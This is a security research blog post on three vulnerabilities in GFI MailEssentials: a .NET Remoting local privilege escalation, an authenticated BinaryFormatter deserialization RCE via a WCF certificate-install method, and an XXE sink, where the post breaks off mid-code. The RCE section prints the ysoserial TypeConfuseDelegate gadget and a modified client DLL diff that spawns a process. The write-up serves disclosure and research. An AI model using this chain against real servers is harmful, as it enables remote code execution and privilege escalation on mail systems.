---
layout: post
date:   2025-04-28 03:00:00 +0200
title:  "GFI MailEssentials - Yet Another .NET Target"
categories: vulns4free
---

What is this product *GFI MailEssentials* all about? We're living the future, right? So let's ask the GFI AI.

{:refdef: style="text-align: center;"}
![GFI MailEssentials Introduction](/assets/images/mailessentials/gfiblog_introduction.png)
{: refdef}

Since we're doing security research here, why not asking about the disclosure process as well?

{:refdef: style="text-align: center;"}
![GFI Vulnerability Disclosure](/assets/images/mailessentials/gfiblog_howtodisclose.png)
{: refdef}

Sounds good. Spoiler: it didn't work this way but in the end disclosure did take place in January 2025 on another channel.

# Setup

The setup process turned out to be quite easy. One can simply get a [free trial](https://gfi.ai/products-and-solutions/network-security-solutions/mailessentials/free-trial) version
on GFI's company website after providing some data for registration. Since the product's main purpose is email content processing and as the setup suggested, I first thought about installing a Microsoft Exchange
server. Luckily, I read the [system requirements](https://gfi.ai/products-and-solutions/network-security-solutions/mailessentials/resources/documentation/system-requirements)
in advance which stated:

> Microsoft IIS SMTP service or Microsoft Exchange Server 2010/2013/2016

So how to install Microsoft's IIS SMTP service instead. After some googling I found this snippet for PowerShell:

```
Import-Module Servermanager
Add-WindowsFeature SMTP-Server
```

You could probably do the same via the Server Manager UI. After completing the wizards, everything seemed to work fine.

# Technology Stack Enumeration

Starting the `inetmgr`, I observed two new application pools, `MailEssentials` and `MailEssentials_Services`. Beneath, three applications were found.

{:refdef: style="text-align: center;"}
![inetmgr](/assets/images/mailessentials/gfiblog_inetmgr.png)
{: refdef}

A right click on one of the applications gives a context menu with an "Explore" entry, automatically opening the webroot of the targeted application in your file browser.

{:refdef: style="text-align: center;"}
![inetmgr Explore](/assets/images/mailessentials/gfiblog_inetmgrexplore.png)
{: refdef}

I always like to browse through the related directories to learn about the technology stack first. I.e. collecting all kind of file types, look into configuration files etc.
Some facts I found are shown next, mainly read from `C:\Program Files (x86)\GFI\MailEssentials\wwwconf\web.config`:

* Learn about predefined application setting values in `<appSettings>`
* Find HTTP Modules in `<httpModules>` sections; these are usually triggered for every request (a nice pre-auth attack surface opportunity)
* Look for HTTP Handlers in `<httpHandlers>` sections, defining e.g. which file extension in an URI path might be handled by which .NET class
* In general, `<add assembly="[PLACEHOLDER]" />` is obviously a good indicator which .NET Assemblies are in use
* Authorization indicators are found in `<authorization>` sections
* `<system.serviceModel>` section often hold information about web services, their endpoints and their implementing classes

Of course, this is an incomplete list and also special to this specific product, but Microsoft provides excellent online documentation for every single attribute.
Speaking of "special to this product", I spotted a `web.config` section of special interest almost immediately: `<system.runtime.remoting>`.
This seems to match with the namespace of the famous .NET Remoting technology `System.Runtime.Remoting`. And indeed, I found several examples on older
blogs about people using `<system.runtime.remoting>` sections to define well-known types with its implementing class(es) referenced. Up to this point,
I've mostly seen .NET Remoting being used in a purely programmatic sense. In case of GFI MailEssentials,
this declarative alternative looks a bit different:

```xml
<system.runtime.remoting>
  <application name="MEComplete">
    <client url="tcp://localhost:8013">
      <wellknown type="MEC.Reporting.Base.IReporting, MEC.Reporting.Base" url="tcp://localhost:9093/Report" />
      <wellknown type="MEC.ConfigurationServices.ConfigurationService, MEC.ConfigurationServices" url="tcp://localhost:9091/ConfigurationServices" />
      <wellknown type="MEC.Configuration.Base.IRemotingHelper, MEC.Configuration.Base" url="tcp://localhost:9091/RemotingHelper" />
      <wellknown type="MEC.Configuration.Base.IPatchChecker, MEC.Configuration.Base" url="tcp://localhost:9091/PatchChecker" />
      <wellknown type="MEC.Configuration.Base.RemotingHelper, MEC.Configuration" url="tcp://localhost:9091/RemotingHelper" />
      <wellknown type="MEC.RemoteMonitor.RemotingMonitor, MEC.RemoteMonitor" url="tcp://localhost:9091/ContentSecurity/RemoteMonitor" />
      <wellknown type="ContentSecurity.ML.QSS.QuarantineStoreServices, ContentSecurity.ML.QSS" url="tcp://localhost:9093/ContentSecurity/QuarantineServices" />
      <wellknown type="MEC.RSSRemotePlugin.RSSRemotePlugin, MEC.RSSRemotePlugin" url="tcp://localhost:9093/ContentSecurity/RemoteRSS" />
      <wellknown type="ContentSecurity.ML.Quar.IQuar, ContentSecurity.ML.Quar.Base" url="tcp://localhost:9093/ContentSecurity/Quar" />
      <wellknown type="ContentSecurity.ML.QSS.IQuarantineStore, ContentSecurity.ML.QSS.Base" url="tcp://localhost:9093/ContentSecurity/QuarantineServices" />
      <wellknown type="MEC.ConfigurationServices.IRuleDb, MEC.ConfigurationServices.Base" url="tcp://localhost:9091/ConfigurationServices" />
      <wellknown type="ContentSecurity.ML.AST.WdPFolders.PublicFolderTraining, ContentSecurity.ML.AST.WdPFolders" url="tcp://localhost:9091/ContentSecurity/PublicFolderTraining" />
      <wellknown type="ContentSecurity.ML.AST.EWSPFolders.PublicFolderTraining, ContentSecurity.ML.AST.EWSPFolders" url="tcp://localhost:9091/ContentSecurity/PublicFolderTrainingEWS" />
    </client>
  </application>
</system.runtime.remoting>
```

Remoting sounds pretty much like "remote", but you might be surprised how often one finds inter-process communication on the same machine with this technology even nowadays.
We all, hopefully, know that .NET Remoting is a gift for vulnerability researchers. I highly recommend you to read about a [series](https://code-white.com/blog/2022-01-dotnet-remoting-revisited/) [of](https://code-white.com/blog/leaking-objrefs-to-exploit-http-dotnet-remoting/) [blogs](https://code-white.com/blog/teaching-the-old-net-remoting-new-exploitation-tricks/) of my colleague @mwulftange.
He basically destroyed the last hopes on making .NET Remoting secure and even Microsoft marked it as an obsolete and dangerous technique these days.

# Vulnerability I - Built-in Local Privilege Escalation

From the referenced blogs above, you learnt about different channel sink variants (`HTTPServerChannel`, `IPCServerChannel`, `TCPServerChannel`) and its different constellations
with .NET formatters. Obviously, we see that the well-known services are based on the TCP variant and its most common serializer `System.Runtime.Serialization.Formatters.Binary.BinaryFormatter`.
So without diving into the code, just by looking at the configuration files, we might be brave enough to simply use the existing .NET Remoting knowledge and tooling
for a first quick finding: a local privilege escalation.

All we need is a low-priv user, we call him `nonadmin`. Then a malicious serialized object, later being deserialized by our friend `BinaryFormatter`, has to be created with [ysoserial .NET](https://github.com/pwntester/ysoserial.net).
Deliver this payload then with James Forshaw's tooling [ExploitRemotingService](https://github.com/tyranid/ExploitRemotingService). Let's see this in action (GIF video links can be found in captions).

{:refdef: style="text-align: center;"}
![LPE](/assets/images/mailessentials/gfiblog_lpe.png)
**See the full GIF video [here](/assets/images/mailessentials/gfiblog_lpe.gif)**
{: refdef}

SYSTEM is ours!

# Vulnerability II - More Deserialization Please

Using .NET Remoting seems to be a bit outdated, indeed. So maybe we find another use of dangerous deserialization issues.
But before diving into this kind of variant analysis, further enumeration is needed. We don't want to miss attack surface, do we?
Back to the `inetmgr`, two more applications were shown: `MailEssentials_Services` and `MailEssentialsRSS`. If you didn't browse to the
corresponding endpoints yet, do it now. Otherwhise, your IIS worker processes `w3wp.exe` won't show up in the process list and therefore not
in your favourite .NET decompiler tool (which in my case is still [dnSpy](https://github.com/dnSpy/dnSpy) most of the time). Also keep in mind, that
you might find 32-bit and/or 64-bit optimized .NET processes running. This is why I always open both dnSpy versions in parallel to make sure
that I don't miss any related processes. Turns out, that was a good idea in the first place for GFI MailEssentials.

{:refdef: style="text-align: center;"}
![dnSpy64 Processes](/assets/images/mailessentials/gfiblog_dnspy64.png)
{: refdef}

{:refdef: style="text-align: center;"}
![dnSpy32 Processes](/assets/images/mailessentials/gfiblog_dnspy32.png)
{: refdef}

But only in the 64-bit version, we observe IIS worker processes, ready to be attached by our tooling. If you've enough machine power available (especially lots of RAM),
during the enumeration phase I recommend to attach to all processes at once; at least in the first few rounds of your investigation. Then press Crtl+Alt+U and choose "Open All Modules" in the context menu
to get the full blown package of .NET Assemblies loaded.

Since we see a lot of GFI MailEssentials processes, these processes probably have to communicate with each other a lot. We've already seen one potential
technology being used for this: .NET Remoting using `BinaryFormatter` de/serialization.

Now, I assumed that this formatter might be used in other ways, too. So in dnSpy we call for decompilation of `System.Runtime.Serialization.Formatters.Binary.BinaryFormatter`.
We press Crtl+Shift+R to call the "Analyze" function, searching for all uses of this class.

{:refdef: style="text-align: center;"}
![BF Users](/assets/images/mailessentials/gfiblog_bfusages.png)
{: refdef}

This returns a large amount of GFI MailEssentials classes but also other 3rd party libraries.
Scrolling through the findings finally led me to an interesting `System.Runtime.Serialization.Formatters.Binary.BinaryFormatter::Deserialize(System.IO.Stream)` call at
`MailEssentialsClientService.MasterClass/MultiNodeService::InstallClientCertificate(System.IO.Stream)`.

```csharp
public static void InstallClientCertificate(Stream certificateStream)
{
	MasterClass.MultiNodeService.Log.Info("InstallClientCertificate() >>", new object[0]);
	try
	{
		IRemotingHelper @object = MasterClass.MultiNodeService._activator.GetObject<IRemotingHelper>();
		MemoryStream memoryStream = new MemoryStream();
		byte[] array = new byte[10000];
		int num;
		do
		{
			num = certificateStream.Read(array, 0, array.Length); // [1]
			memoryStream.Write(array, 0, num); // [2]
		}
		while (num > 0);
		memoryStream.Position = 0L;
		if (memoryStream != null)
		{
			using (memoryStream)
			{
				BinaryFormatter binaryFormatter = new BinaryFormatter();
				memoryStream.Seek(0L, SeekOrigin.Begin);
				X509Certificate2 x509Certificate = (X509Certificate2)binaryFormatter.Deserialize(memoryStream); // [3]
				@object.CreateCertificate(x509Certificate, "GFIMailEssentials", X509FindType.FindBySubjectName, StoreName.TrustedPeople, StoreLocation.LocalMachine, false);
				if (Environment.OSVersion.Version.Major == 5 && Environment.OSVersion.Version.Minor == 2)
				{
					@object.CreateCertificate(x509Certificate, "GFIMailEssentials", X509FindType.FindBySubjectName, StoreName.Root, StoreLocation.LocalMachine, false);
				}
			}
		}
	}
  // ...
```

The method takes a `System.IO.Stream` parameter `certificateStream` which is read into a byte array [1] and then written into a `System.IO.MemoryStream` [2].
The content gets deserialized by calling `System.Runtime.Serialization.Formatters.Binary.BinaryFormatter::Deserialize(System.IO.Stream)` [3] without any further
protections/defenses. Where is this `certificateStream` coming from? Can we control it?

By using the dnSpy Analyzer, we follow the method's call back to `MailEssentialsClientService.MultiNodeConfigurationService::InstallClientCertificate(System.IO.Stream)`.

`MailEssentialsClientService.MultiNodeConfigurationService` is annotated with the attribute [`System.ServiceModel.ServiceBehaviorAttribute`](https://learn.microsoft.com/en-us/dotnet/api/system.servicemodel.servicebehaviorattribute?view=netframework-4.8.1).
Looking at the interface `MEC.Configuration.Base.IMultiNodeConfigurationService`, the attribute use of [`System.ServiceModel.ServiceContractAttribute`](https://learn.microsoft.com/en-us/dotnet/api/system.servicemodel.servicecontractattribute?view=netframework-4.8.1) is revealed.

> Indicates that an interface or a class defines a service contract in a Windows Communication Foundation (WCF) application.

Let's search for web service artifacts again on the file system, e.g. for `.svc` file extensions. We find it at `C:\Program Files (x86)\GFI\MailEssentials\wwwservices\MultiNodeConfigurationService.svc`.

{:refdef: style="text-align: center;"}
![MultiNodeConfigurationService](/assets/images/mailessentials/gfiblog_multinodeconfservice.png)
{: refdef}

```xml
<%@ ServiceHost Language="C#" Debug="true" Service="MailEssentialsClientService.MultiNodeConfigurationService" CodeBehind="MultiNodeConfigurationService.svc.cs" %>
```

Browsing to `/MailEssentials_Services/MultiNodeConfigurationService.svc` shows us the standard service page with examples for client stubs etc., and of course also
the link to the WSDL URI. Calling the path gives us the interface description with all of its methods, parameters etc.

{:refdef: style="text-align: center;"}
![WSDL Fetch](/assets/images/mailessentials/gfiblog_wsdlfetch.png)
{: refdef}

Using the good old [Burp Suite WSDLer](https://github.com/portswigger/wsdler) is a convenient way to build request templates for each remote method call.

{:refdef: style="text-align: center;"}
![WSDLer](/assets/images/mailessentials/gfiblog_wsdler.png)
{: refdef}

And here we are, with a template for our `InstallClientCertificate` method call.

```
POST /MailEssentials_Services/MultiNodeConfigurationService.svc HTTP/1.1
Connection: keep-alive
Referer: http://[HOST]/MailEssentials_Services/MultiNodeConfigurationService.svc
SOAPAction: http://tempuri.org/IMultiNodeConfigurationService/InstallClientCertificate
Content-Type: text/xml;charset=UTF-8
Host: [HOST]
Content-Length: [CONTENT_LENGTH]

<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
   <soap:Header/>
   <soap:Body>
      <tem:InstallClientCertificate>
         <!--type: StreamBody-->
         <tem:certificateStream>ZQ==</tem:certificateStream>
      </tem:InstallClientCertificate>
   </soap:Body>
</soap:Envelope>
```

Putting a malicious serialized object in Base64 encoded format into `<tem:certificateStream/>` should be a piece of cake.
Sending this to the Burp Suite Repeater (after correcting the content type to `Content-Type: application/soap+xml; charset=utf-8`),
I got a 500 status code response which wasn't too bad but the response body content was a bit unexpected.

```xml
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"
    xmlns:a="http://www.w3.org/2005/08/addressing">
    <s:Header>
        <a:Action s:mustUnderstand="1">http://www.w3.org/2005/08/addressing/soap/fault</a:Action>
    </s:Header>
    <s:Body>
        <s:Fault>
            <s:Code>
                <s:Value>s:Sender</s:Value>
                <s:Subcode>
                    <s:Value
                        xmlns:a="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd">
                        a:InvalidSecurity</s:Value>
                </s:Subcode>
            </s:Code>
            <s:Reason>
                <s:Text xml:lang="de-DE">An error occurred when verifying security for the message.</s:Text>
            </s:Reason>
        </s:Fault>
    </s:Body>
</s:Envelope>
```

"Verifying security" and a reference to [http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd](http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd) wasn't encouraging. Googling for the terms brought me to an OASIS specification [Web Services Security: SOAP Message Security 1.1 (WS-Security 2004)](https://docs.oasis-open.org/wss/v1.1/wss-v1.1-spec-pr-SOAPMessageSecurity-01.htm) about SOAP message security. Message-based encryption and/or signature for SOAP
web services didn't look very promising to me reaching a quick PoC level. After reading a bit of RFCs and protocol specifications, I decided to go back for the
GFI specifics, so I looked at the `web.config` belonging to `wwwservices`, collecting some new ideas.

A small side note: for error scenarios like this, I love to use dnSpy as well. Simply set "exception breakpoints" 

{:refdef: style="text-align: center;"}
![Enable Exception Breakpoints](/assets/images/mailessentials/gfiblog_enableexcpbp.png)
{: refdef}

and send the request again.

{:refdef: style="text-align: center;"}
![Exception Hit](/assets/images/mailessentials/gfiblog_exchit.png)
{: refdef}

The exception message gives us a bit more details.

```
System.ServiceModel.Security.MessageSecurityException: Security processor was unable to find a security header in the message. This might be because the message is an unsecured fault or because there is a binding mismatch between the communicating parties. This can occur if the service is configured for security and the client is not using security.
   at System.ServiceModel.Security.SecurityStandardsManager.CreateReceiveSecurityHeader(Message message, String actor, SecurityAlgorithmSuite algorithmSuite, MessageDirection direction)}	System.ServiceModel.Security.MessageSecurityException
```

But back to the `web.config` approach. The first hints were found in the root section `<system.serviceModel>` and its children below `<services>`. An excerpt for the web service we're interested in is shown next.

```xml
<service behaviorConfiguration="MailEssentialsClientService.MultiNodeConfigurationService" name="MailEssentialsClientService.MultiNodeConfigurationService">
  <endpoint address="" binding="customBinding" bindingConfiguration="MaxClockSkewBinding" contract="MEC.Configuration.Base.IMultiNodeConfigurationService" />
  <endpoint address="mex" binding="mexHttpBinding" contract="IMetadataExchange" />
</service>
```

But even more interesting were the descriptions under `<behaviors> -> <serviceBehaviors>` sections, again for our specific service the corresponding snippet.

```xml
<behavior name="MailEssentialsClientService.MultiNodeConfigurationService">
  <serviceMetadata httpGetEnabled="true" />
  <serviceDebug includeExceptionDetailInFaults="true" />
  <serviceCredentials>
    <serviceCertificate findValue="GFIMailEssentials" x509FindType="FindBySubjectName" />
    <userNameAuthentication userNamePasswordValidationMode="Custom" customUserNamePasswordValidatorType="MailEssentialsClientService.CustomUserNameValidator, MailEssentialsClientService" />
  </serviceCredentials>
  <serviceSecurityAudit auditLogLocation="Application" suppressAuditFailure="true" serviceAuthorizationAuditLevel="Failure" messageAuthenticationAuditLevel="Failure" />
</behavior>
```

The [`<serviceCredentials>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/servicecredentials) sections

> Specifies the credential to be used in authenticating the service and the client credential validation-related settings.

Especially, the [`<userNameAuthentication>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/usernameauthentication) was completely new to me. We see a *"custom" username and password validation mode* and its `customUserNamePasswordValidatorType` to `MailEssentialsClientService.CustomUserNameValidator`.
And yes, the class exists and extends `System.IdentityModel.Selectors.UserNamePasswordValidator`. Especially, overwriting the `System.IdentityModel.Selectors.UserNamePasswordValidator::Validate(System.String,System.String)` method gives full control over the authentication implementation. So the custom implementation in
`MailEssentialsClientService.CustomUserNameValidator::Validate(System.String,System.String)` looks like this.

```csharp
public override void Validate(string userName, string password)
{
	try
	{
		if (string.IsNullOrEmpty(RemotingConfiguration.ApplicationName))
		{
			RemotingConfiguration.Configure(AppDomain.CurrentDomain.SetupInformation.ConfigurationFile, false);
		}
		AppDomain.CurrentDomain.SetData("SQLServerCompactEditionUnderWebHosting", true);
		MasterClass.LogDebug("ValidateCredentials...", this.category);
		MasterClass.LogDebug(string.Format("ValidateCredentials... Username: {0}", userName), this.category);
		if (string.IsNullOrWhiteSpace(userName) || string.IsNullOrWhiteSpace(password))
		{
			MasterClass.LogWarning("ValidateCredentials... Username or password is null!", this.category);
			throw new FaultException("Wrong username or password!", new FaultCode("WrongUserNameOrPassword"));
		}
		IRemotingHelper remotingHelperInstance = MasterClass.GetRemotingHelperInstance();
		bool usingActiveDirectory = remotingHelperInstance.GetUserManagementObject().UsingActiveDirectory;
		if (usingActiveDirectory) // [4]
		{
			MasterClass.LogDebug("ValidateCredentials... Active Directory authentication", this.category);
			if (!userName.Contains('\\') && !userName.Contains('@'))
			{
				userName = string.Format("{0}@{1}", userName, GetSId.GetLocalDomain());
				MasterClass.LogDebug(string.Format("ValidateCredentials... Domain not entered! Assuming it belongs to the local domain: {0}", userName), this.category);
			}
			try
			{
				if (!remotingHelperInstance.IsAuthenticate(userName, password, true))
				{
					MasterClass.LogWarning("ValidateCredentials... Wrong username or password!", this.category);
					throw new FaultException("Wrong username or password!", new FaultCode("WrongUserNameOrPassword"));
				}
				MasterClass.LogDebug("ValidateCredentials...  User authenticated", this.category);
				goto IL_1BC;
			}
			catch (Exception ex)
			{
				MasterClass.LogWarning("ValidateCredentials... " + ex, this.category);
				throw new FaultException("Wrong username or password!", new FaultCode("WrongUserNameOrPassword"));
			}
		}
		MasterClass.LogDebug("ValidateCredentials... Local authentication", this.category);
		if (!remotingHelperInstance.IsAuthenticate(userName, password, false)) // [5]
		{
			MasterClass.LogWarning("ValidateCredentials... Wrong username or password!", this.category);
			throw new FaultException("Wrong username or password!", new FaultCode("WrongUserNameOrPassword"));
		}
		MasterClass.LogDebug("ValidateCredentials... User authenticated", this.category);
		IL_1BC:;
	}
	// ...
```

Using `userName` and `password`, the `Validate` method tries to authenticate the identity using either Active Directory (AD) access [4], or a local Windows user [5].
Following e.g. the AD case down to `MEC.Sid.GetSId::IsAuthenticate(System.String,System.String,System.Boolean)` shows that only the successful authentication is a requirement
for further processing, but no authorization checks were seen on the way. If one compares this to other web service methods such as ``MailEssentialsClientService.MasterClass/MultiNodeService::CheckForNewCertificates(System.Collections.Generic.List`1<System.String>,System.String)``,

```csharp
public static Stream CheckForNewCertificates(List<string> certificatesSerials, string loggedInUser)
{
	MasterClass.MultiNodeService.Log.Info("CheckForNewCertificates() >>", new object[0]);
	Stream stream = null;
	try
	{
		if (!MasterClass.MultiNodeService.IsCurrentUserAdmin(loggedInUser)) // [6]
		{
			throw new Exception("User is not an admin!"); // [7]
		}
		// ...
```

we see that a method `IsCurrentUserAdmin` checks for the identity being an administrator (SID check under the hood) [6] and throws an exception if not [7].
Nothing like this for our `MailEssentialsClientService.MasterClass/MultiNodeService::InstallClientCertificate(System.IO.Stream)`: what a coincidence.

I tried my best for a few hours with [SoapUI](https://www.soapui.org/) to configure the client according to every configuration snippet I was reading about,
but in the end I chose the lazy approach (again!). My goal was to prove that the vulnerability exists and is indeed exploitable.
Wasn't there some user interface or something which I could at least reuse to create proper web service calls? It's called `MultiNodeService` which was
a hint into the right direction, so I searched the normal web application at `/MailEssentials` for the matching function.

I didn't have to search for long.

{:refdef: style="text-align: center;"}
![Multiserver Setup View](/assets/images/mailessentials/gfiblog_multiserver.png)
{: refdef}

Let's clone the GFI MailEssentials instance so a multi server setup makes sense. Then, the new instance is defined as "master server" (according to GFI's terminology)
and the old instance we configure as "slave server" like this.

{:refdef: style="text-align: center;"}
![Multiserver Setup Process](/assets/images/mailessentials/gfiblog_multiserversetup.png)
{: refdef}

But before hitting anymore buttons, [Wireshark](https://www.wireshark.org/) is started on the slave server instance. Then the setup is completed!
What does Wireshark tell us? Did we hit the function we were looking for?

Looking at the Wireshark streams, we see that our slave server instance fetched the WSDL via `/MailEssentials_Services/MultiNodeConfigurationService.svc?wsdl`
from the master server. I.e. `MultiNodeConfigurationService` is indeed the web service being called. And we can also observe some SOAP message encryption
on the wire, the ones I was too silly for building those with SoapUI...

{:refdef: style="text-align: center;"}
![Wireshark Dump](/assets/images/mailessentials/gfiblog_wireshark.png)
{: refdef}

So how could my lazy approach look like? What if we simply change the client (slave instance) code so that our malicious serialized object
will be sent over the wire instead of the certificate? I will spare you the arduous task of finding the correct method and present you
`MEC.Configuration.RemotingHelper::ExchangeMultiNodeCertificates(MEC.Configuration.Base.IMultiNodeConfigurationService)`. You can verify this
by attaching all processes in dnSpy **32-bit** and set a breakpoint. The `MEC.Configuration.RemotingHelper` namespace might trigger some
exploiter senses as well and you might be reminded of our LPE vulnerability case (good catch!). This is also the reason why finding
the proper method, and choosing the correct process with dnSpy bitness, made this a bit hard. 
Let me share a blogger’s favorite phrase: I left this path as an exercise for the reader.

Let's change some client-side code.
Load the .NET Assembly `C:\Program Files (x86)\GFI\MailEssentials\Attendant\bin\MEC.Configuration.dll` in dnSpy (not the one in the `Temporary ASP.NET Files` directory; do you know why?) and use James Forshaw's famous
[TypeConfuseDelegate gadget](https://github.com/pwntester/ysoserial.net/blob/master/ysoserial/Generators/TypeConfuseDelegateGenerator.cs) to prove the exploitability, shall we?

The relevant code from ysoserial .NET is this.

```csharp
public static object TypeConfuseDelegateGadget(InputArgs inputArgs)
{
    string cmdFromFile = inputArgs.CmdFromFile;

    if (!string.IsNullOrEmpty(cmdFromFile))
    {
        inputArgs.Cmd = cmdFromFile;
    }
    
    Delegate da = new Comparison<string>(String.Compare);
    Comparison<string> d = (Comparison<string>)MulticastDelegate.Combine(da, da);
    IComparer<string> comp = Comparer<string>.Create(d);
    SortedSet<string> set = new SortedSet<string>(comp);
    set.Add(inputArgs.CmdFileName);
    if (inputArgs.HasArguments)
    {
        set.Add(inputArgs.CmdArguments);
    }
    else
    {
        set.Add("");
    }
    
    FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
    object[] invoke_list = d.GetInvocationList();
    // Modify the invocation list to add Process::Start(string, string)
    invoke_list[1] = new Func<string, string, Process>(Process.Start);
    fi.SetValue(d, invoke_list)
    return set;
}
```

I provide you a diff between the original and modified GFI code then.

```csharp
// Original
X509Certificate2 certificate = this.GetCertificate("GFIMailEssentials");
Stream stream = null;
if (certificate != null)
{
	BinaryFormatter binaryFormatter2 = new BinaryFormatter();
	stream = new MemoryStream();
	binaryFormatter2.Serialize(stream, certificate);
	stream.Position = 0L;
}
masterMultiNodeConfigurationService.InstallClientCertificate(stream);
return flag;
// ------------------------------------------------------------------
// Modified
bool certificate = this.GetCertificate("GFIMailEssentials") != null;
// ysoserial.NET TypeConfuseDelegate gadget
Comparison<string> comparison = new Comparison<string>(string.Compare);
Comparison<string> comparison2 = (Comparison<string>)Delegate.Combine(comparison, comparison);
SortedSet<string> sortedSet = new SortedSet<string>(Comparer<string>.Create(comparison2));
sortedSet.Add("calc.exe");
sortedSet.Add("");
FieldInfo field = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.Instance | BindingFlags.NonPublic);
object[] invocationList = comparison2.GetInvocationList();
object[] array2 = invocationList;
array2[1] = new Func<string, string, Process>(Process.Start);
field.SetValue(comparison2, array2);

Stream stream = null;
if (certificate)
{
	BinaryFormatter binaryFormatter2 = new BinaryFormatter();
	stream = new MemoryStream();
	binaryFormatter2.Serialize(stream, sortedSet); //serializing sortedSet instead of certificate
	stream.Position = 0L;
}
masterMultiNodeConfigurationService.InstallClientCertificate(stream);
return flag;
```

Right-click on `RemotingHelper` and choose "Edit Class (C#)..." to open the modification dialog

{:refdef: style="text-align: center;"}
![Edit Class](/assets/images/mailessentials/gfiblog_editclass.png)
{: refdef}

and modify it accordingly.

{:refdef: style="text-align: center;"}
![Modified Class](/assets/images/mailessentials/gfiblog_modifiedclass.png)
{: refdef}

The old `MEC.Configuration.dll` now has to be overwritten in its GFI MailEssentials directory after all GFI services had been stopped.
After restarting all services, setup the "Multi-Server" constellation. As soon as you click "Apply" on your "slave server" setup,
a `calc` will pop up on the "master server" side as indicated in the picture below.

{:refdef: style="text-align: center;"}
![Deserialization RCE](/assets/images/mailessentials/gfiblog_bfrce.png)
**See the full GIF video [here](/assets/images/mailessentials/gfiblog_bfrce.gif)**
{: refdef}

We achieved RCE on the "master server" by a few modifications and using the web user interface. But I'm pretty convinced that *any authenticated user*
(think about AD environments as worst case scanario) would be able to trigger RCE this way.
We learnt why: look at our investigation of `MailEssentialsClientService.CustomUserNameValidator::Validate(System.String,System.String)` again,
combined with the missing authorization check in `MailEssentialsClientService.MasterClass/MultiNodeService::InstallClientCertificate(System.IO.Stream)`.

I'm confident one of my readers will ultimately be able to exploit this without my complex experimental setup. Let me know if you succeed.


# Vulnerability III - A Pinch of XML External Entity at the End

Vulnerability II already was a lot of pain and work so I got through my list of other dangerous sinks and found tons of other interesting stuff
such as calls to `System.Xml.XmlDocument::LoadXml(System.String)`: a classic XML External Entity (XXE) sink but with a subtle restriction.
As you might know, applications using [.NET Framework >= 4.5.2](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#net)
are (kind of) protected against various XXE attack vectors by default. Let's use the dnSpy Analyzer to find GFI-related code.

{:refdef: style="text-align: center;"}
![XXE Sink](/assets/images/mailessentials/gfiblog_xxesink.png)
{: refdef}

`MEC.Configuration.RemotingHelper::ImportAntiPhisingKeywordList(System.Object) -> MEC.Configuration.RemotingHelper::ImportAntiPhisingKeywordList(System.Byte[],System.String)`
seems to be a first good candidate in GFI MailEssential's .NET Assembly namespace. dnSpy doesn't seem to find any more callers for this method but the class
`RemotingHelper` implements several interfaces, right? Starting another analysis with `MEC.Configuration.Base.IRemotingHelper::ImportAntiPhisingKeywordList(System.Byte[],System.String)`
shows a different picture, namely a new caller from `ContentSecurity.Configuration.PhishingKeywords::btnImport_Click(System.Object,System.EventArgs)`.

`ContentSecurity.Configuration.PhishingKeywords` itself extends `ContentSecurity.Configuration.TabPage` which is based on `System.Web.UI.UserControl`. For more information
on `UserControl` and its relation to `.ascx` file extensions, read [Microsoft's documentation](https://learn.microsoft.com/en-us/dotnet/api/system.web.ui.usercontrol?view=netframework-4.8.1). We'll find `ContentSecurity.Configuration.PhishingKeywords` in at least two different files:

* `C:\Program Files (x86)\GFI\MailEssentials\wwwconf\pages\MailSecurity\Phishing.aspx`
* `C:\Program Files (x86)\GFI\MailEssentials\wwwconf\pages\MailSecurity\PhishingKeywords.ascx`

`Pishing.aspx` contains our User Control `.ascx` name in its tag definitions at the very top.

```
<%@ Page Title="" Language="C#" MasterPageFile="Master.Master" EnableEventValidation="false"  AutoEventWireup="true" CodeBehind="Phishing.aspx.cs" Inherits="ContentSecurity.Configuration.Phishing"%>
<%@ Register TagPrefix="cc1" Namespace="MailEssentials.StringsProvider" Assembly="MailEssentials.StringsProvider" %>
<%@ Register assembly="Telerik.Web.UI" namespace="Telerik.Web.UI" tagprefix="telerik" %>
<%@ Register TagPrefix="Pv" TagName="Pv1" Src="phishinggeneral.ascx"%>
<%@ Register TagPrefix="Pv" TagName="Pv2" Src="phishingkeywords.ascx"%>
<%@ Register TagPrefix="Pv" TagName="Pv3" Src="phishingupdates.ascx"%>
<%@ Register TagPrefix="Pv" TagName="Pv4" Src="phishingactions.ascx"%>
<%-- ... --%>
```

The `.ascx` file then points to the code behind User Control.

```
<%@ Control Language="C#" AutoEventWireup="true" CodeBehind="PhishingKeywords.ascx.cs"
    Inherits="ContentSecurity.Configuration.PhishingKeywords" %>
	<%-- ... --%>
```

Quickly, I was able to locate the function on the web interface as well.

{:refdef: style="text-align: center;"}
![Web UI User Control](/assets/images/mailessentials/gfiblog_phishingnavigation.png)
{: refdef}

Now back to our code base, belonging to the user interface import button click event at `ContentSecurity.Configuration.PhishingKeywords::btnImport_Click(System.Object,System.EventArgs)`.

```csharp
protected void btnImport_Click(object sender, EventArgs e)
{
	this.lblImportMessage.Text = string.Empty;
	try
	{
		if (this.fuUlpload.HasFile) // [9]
		{
			if (this.fuUlpload.FileName.ToLowerInvariant().EndsWith("xml")) // [10]
			{
				using (MemoryStream memoryStream = new MemoryStream())
				{
					byte[] array = new byte[16384];
					int num;
					while ((num = this.fuUlpload.PostedFile.InputStream.Read(array, 0, array.Length)) > 0) // [11]
					{
						memoryStream.Write(array, 0, num); // [12]
					}
					memoryStream.Position = 0L;
					MasterClass.GetRemotingHelperInstance().ImportAntiPhisingKeywordList(memoryStream.ToArray(), "xml"); // [13]
				}
				this.TmrUploadStatus.Enabled = true;
			}
			else
			{
				this.lblImportMessage.ForeColor = Color.Red;
				this.lblImportMessage.Text = this.StringsProvider1.GetString("fileTypeNotSupported");
			}
		}
		else
		{
			this.lblImportMessage.ForeColor = Color.Red;
